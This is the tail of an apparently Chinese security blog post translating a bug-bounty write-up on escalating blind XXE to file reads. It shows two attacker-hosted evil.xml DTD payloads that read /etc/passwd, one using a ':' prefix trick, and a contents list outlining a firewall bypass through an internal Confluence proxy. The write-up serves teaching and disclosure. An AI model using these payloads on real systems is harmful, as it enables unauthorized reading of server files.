+<h4 id="emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"><a href="#emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容" class="headerlink" title="&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"></a>&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容</h4><p>[*]攻击者服务器上的evil.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/16.png" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
+<h4 id="emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制"><a href="#emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制" class="headerlink" title="&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制"></a>&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制</h4><p>[*]攻击者服务器上的evil.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;:%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/17.png" alt=""></p>
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/12/20/第三篇翻译：XXE漏洞/">第三篇翻译：XXE漏洞</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
+        <p><span>发布时间:</span>2018-12-20, 20:54:30</p>
+        <p><span>最后更新:</span>2018-12-20, 20:54:58</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/12/20/第三篇翻译：XXE漏洞/" title="第三篇翻译：XXE漏洞">http://TimeS0ng.github.io/2018/12/20/第三篇翻译：XXE漏洞/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/20/第三篇翻译：XXE漏洞/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/">
+                    第二篇翻译：URL重定向
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：From-blind-XXE-to-root-level-file-read-access"><span class="toc-number">1.</span> <span class="toc-text">原文：From blind XXE to root-level file read access</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞："><span class="toc-number">2.</span> <span class="toc-text">漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Pieter"><span class="toc-number">3.</span> <span class="toc-text">作者：Pieter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：高"><span class="toc-number">4.</span> <span class="toc-text">难度：高</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"><span class="toc-number">5.</span> <span class="toc-text">  接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#我关注的重点？"><span class="toc-number"></span> <span class="toc-text">我关注的重点？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"><span class="toc-number">1.</span> <span class="toc-text">  一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"><span class="toc-number">2.</span> <span class="toc-text">  当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"><span class="toc-number">3.</span> <span class="toc-text">  继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"><span class="toc-number">4.</span> <span class="toc-text">  尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放"><span class="toc-number">5.</span> <span class="toc-text">  我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注…"><span class="toc-number"></span> <span class="toc-text">盲注…</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"><span class="toc-number">1.</span> <span class="toc-text">  当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在"><span class="toc-number">2.</span> <span class="toc-text">  当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"><span class="toc-number">3.</span> <span class="toc-text">  接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"><span class="toc-number">4.</span> <span class="toc-text">  既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"><span class="toc-number">5.</span> <span class="toc-text">  现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#柳暗花明？！"><span class="toc-number"></span> <span class="toc-text">柳暗花明？！</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html"><span class="toc-number">1.</span> <span class="toc-text">  当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 https://www.freebuf.com/vuls/168719.html</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…"><span class="toc-number">2.</span> <span class="toc-text">  代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败….</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"><span class="toc-number">3.</span> <span class="toc-text">  出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http://Confluence.company.internal 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html"><span class="toc-number">4.</span> <span class="toc-text">  Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 https://www.freebuf.com/column/181064.html</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来"><span class="toc-number">5.</span> <span class="toc-text">  大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是："><span class="toc-number">6.</span> <span class="toc-text">  但是当我去读取/etc/passwd时，读取到的内容是：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"><span class="toc-number">7.</span> <span class="toc-text">  因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制"><span class="toc-number">8.</span> <span class="toc-text">  通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打赏译者"><span class="toc-number"></span> <span class="toc-text">打赏译者</span></a>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"第三篇翻译：XXE漏洞　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2142877';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/" title="下一篇: 第二篇翻译：URL重定向">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/12/20/第三篇翻译：XXE漏洞/">第三篇翻译：XXE漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/">第二篇翻译：URL重定向</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/">第一篇翻译：越权漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/CVE-2018-8174-漏洞复现/">CVE-2018-8174 漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/04/SQL注入导图/">SQL注入导图</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/04/漫谈攻击链-从webshell到域控的奇妙之旅/">漫谈攻击链--从webshell到域控的奇妙之旅</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/">win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/Windows密码抓取总结/">Windows密码抓取总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（下）/">Windows 提权基础（下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（上）/">Windows 提权基础（上）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/30/kali-代理之shadowsocks-proxychains/">kali 代理之shadowsocks & proxychains</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/bash-伪多进程/">bash 伪多进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/Firewalk-原理/">Firewalk 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/08/kali使用入坑指南（二）/">kali使用入坑指南（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/利用iodine绕过防火墙/">利用iodine绕过防火墙</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali使用入坑指南（一）/">kali使用入坑指南(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali安装KVM入坑笔记/">kali安装KVM入坑笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/花式钓鱼法/">花式钓鱼法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/JBOSS反序列化漏洞复现/">JOBSS反序列化漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/RINETD的妙用/">RINET 的妙用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/27/HTTPS攻击/">HTTPS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/The-Backdoor-Factory/">The-Backdoor-Factory</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/08/Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/MITMF/">MITMF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/无线渗透-序章-中间人攻击/">无线渗透(序章)--中间人攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/Slowhttptest/">Slowhttptest</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/TearDrop/">TearDrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/SOCKSTRESS/">SOCKSTRESS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/21/Syn-Flood/">Syn-Flood</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/03/无线渗透(下)—企业级WPA破解/">无线渗透(下)—企业级WPA破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(中)--WPS破解/">无线渗透(中)--WPS破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(上)--WPA加密/">无线渗透(上)--WPA加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/信息收集— 僵尸扫描/">信息收集— 僵尸扫描</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 TimeS0ng
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
